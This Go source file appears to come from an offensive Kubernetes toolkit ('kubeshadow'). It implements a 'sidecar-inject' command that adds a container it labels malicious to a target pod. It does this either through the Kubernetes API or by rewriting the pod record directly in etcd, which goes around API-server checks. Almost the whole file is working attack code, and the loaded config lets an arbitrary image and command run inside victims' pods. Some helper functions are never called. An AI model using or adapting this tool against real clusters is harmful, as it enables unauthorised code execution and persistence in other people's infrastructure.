package cluster_exploit

import (
	"context"
	"encoding/json"
	"fmt"
	"kubeshadow/pkg/etcd"
	"kubeshadow/pkg/k8s"
	"os"
	"path/filepath"

	"kubeshadow/pkg/errors"
	"kubeshadow/pkg/logger"

	"github.com/spf13/cobra"
	v1 "k8s.io/api/core/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/tools/clientcmd"
)

type SidecarConfig struct {
	Name  string             `json:"name"`
	Image string             `json:"image"`
	Env   []v1.EnvVar        `json:"env,omitempty"`
	Ports []v1.ContainerPort `json:"ports,omitempty"`
	Cmd   []string           `json:"command,omitempty"`
	Args  []string           `json:"args,omitempty"`
}

var (
	// SidecarInjectCmd represents the command for the sidecar injection module
	SidecarInjectCmd = &cobra.Command{
		Use:   "sidecar-inject",
		Short: "Inject a malicious sidecar container into a pod",
		RunE: func(cmd *cobra.Command, args []string) error {
			mode, _ := cmd.Flags().GetString("mode")
			pod, _ := cmd.Flags().GetString("pod")
			namespace, _ := cmd.Flags().GetString("namespace")
			config, _ := cmd.Flags().GetString("config")

			if err := validateSidecarFlags(mode, pod, namespace, config); err != nil {
				return err
			}

			return injectSidecar(cmd.Context(), mode, pod, namespace, config)
		},
	}
)

func init() {
	SidecarInjectCmd.Flags().String("mode", "api", "Injection mode (api or manifest)")
	SidecarInjectCmd.Flags().String("pod", "", "Target pod name")
	SidecarInjectCmd.Flags().String("namespace", "default", "Target namespace")
	SidecarInjectCmd.Flags().String("config", "", "Path to sidecar configuration file")

	if err := SidecarInjectCmd.MarkFlagRequired("pod"); err != nil {
		logger.Error("Failed to mark pod flag as required: %v", err)
	}
	if err := SidecarInjectCmd.MarkFlagRequired("config"); err != nil {
		logger.Error("Failed to mark config flag as required: %v", err)
	}
}

func validateSidecarFlags(mode, pod, namespace, config string) error {
	if pod == "" {
		return errors.New(errors.ErrValidation, "pod name is required", nil)
	}
	if config == "" {
		return errors.New(errors.ErrValidation, "config path is required", nil)
	}
	if mode != "api" && mode != "manifest" {
		return errors.New(errors.ErrValidation, fmt.Sprintf("unsupported mode: %s", mode), nil)
	}

	// Validate config file
	if !filepath.IsAbs(config) {
		return errors.New(errors.ErrValidation, "config path must be absolute", nil)
	}
	if _, err := os.Stat(config); err != nil {
		return errors.New(errors.ErrValidation, "failed to access config file", err)
	}

	return nil
}

func injectSidecar(ctx context.Context, mode, pod, namespace, config string) error {
	// Get Kubernetes client
	kubeconfig := filepath.Join(os.Getenv("HOME"), ".kube", "config")
	clientConfig, err := clientcmd.BuildConfigFromFlags("", kubeconfig)
	if err != nil {
		return errors.New(errors.ErrK8s, "failed to build kubeconfig", err)
	}

	clientset, err := kubernetes.NewForConfig(clientConfig)
	if err != nil {
		return errors.New(errors.ErrK8s, "failed to create kubernetes client", err)
	}

	// Get target pod
	targetPod, err := clientset.CoreV1().Pods(namespace).Get(ctx, pod, metav1.GetOptions{})
	if err != nil {
		return errors.New(errors.ErrK8s, fmt.Sprintf("failed to get pod %s", pod), err)
	}

	// Create sidecar container
	sidecar := v1.Container{
		Name:  "malicious-sidecar",
		Image: "alpine:latest",
		Command: []string{
			"/bin/sh",
			"-c",
			"while true; do sleep 30; done",
		},
	}

	// Add sidecar to pod
	targetPod.Spec.Containers = append(targetPod.Spec.Containers, sidecar)

	// Update pod
	_, err = clientset.CoreV1().Pods(namespace).Update(ctx, targetPod, metav1.UpdateOptions{})
	if err != nil {
		return errors.New(errors.ErrK8s, "failed to update pod with sidecar", err)
	}

	logger.Info("Successfully injected sidecar into pod %s", pod)
	return nil
}

func injectSidecarViaAPI(podName, namespace, configFile string) error {
	clientset, err := k8s.GetClient()
	if err != nil {
		return err
	}

	sidecar, err := loadSidecarConfig(configFile)
	if err != nil {
		return err
	}

	pod, err := clientset.CoreV1().Pods(namespace).Get(context.Background(), podName, metav1.GetOptions{})
	if err != nil {
		return fmt.Errorf("❌ failed to fetch pod: %v", err)
	}

	// Inject sidecar
	pod.Spec.Containers = append(pod.Spec.Containers, *sidecar)

	_, err = clientset.CoreV1().Pods(namespace).Update(context.Background(), pod, metav1.UpdateOptions{})
	if err != nil {
		return fmt.Errorf("❌ failed to update pod: %v", err)
	}
	fmt.Println("✅ Sidecar injected via Kubernetes API.")
	return nil
}

func injectSidecarViaEtcd(endpoint, cert, key, ca, podName, namespace, configFile string) error {
	client, err := etcd.CreateEtcdClient(endpoint, cert, key, ca)
	if err != nil {
		return err
	}
	defer client.Close()

	keyPath := fmt.Sprintf("/registry/pods/%s/%s", namespace, podName)
	resp, err := client.Get(context.Background(), keyPath)
	if err != nil || len(resp.Kvs) == 0 {
		return fmt.Errorf("❌ failed to retrieve pod from etcd: %v", err)
	}

	var pod v1.Pod
	err = json.Unmarshal(resp.Kvs[0].Value, &pod)
	if err != nil {
		return fmt.Errorf("❌ failed to decode pod from etcd: %v", err)
	}

	sidecar, err := loadSidecarConfig(configFile)
	if err != nil {
		return err
	}
	pod.Spec.Containers = append(pod.Spec.Containers, *sidecar)

	raw, err := json.Marshal(pod)
	if err != nil {
		return fmt.Errorf("❌ failed to marshal modified pod: %v", err)
	}

	_, err = client.Put(context.Background(), keyPath, string(raw))
	if err != nil {
		return fmt.Errorf("❌ failed to push pod to etcd: %v", err)
	}

	fmt.Println("✅ Sidecar injected via etcd.")
	return nil
}

func loadSidecarConfig(path string) (*v1.Container, error) {
	raw, err := os.ReadFile(path)
	if err != nil {
		return nil, fmt.Errorf("❌ failed to read config file: %v", err)
	}
	var conf SidecarConfig
	if err := json.Unmarshal(raw, &conf); err != nil {
		return nil, fmt.Errorf("❌ invalid JSON: %v", err)
	}

	return &v1.Container{
		Name:    conf.Name,
		Image:   conf.Image,
		Command: conf.Cmd,
		Args:    conf.Args,
		Env:     conf.Env,
		Ports:   conf.Ports,
	}, nil
}
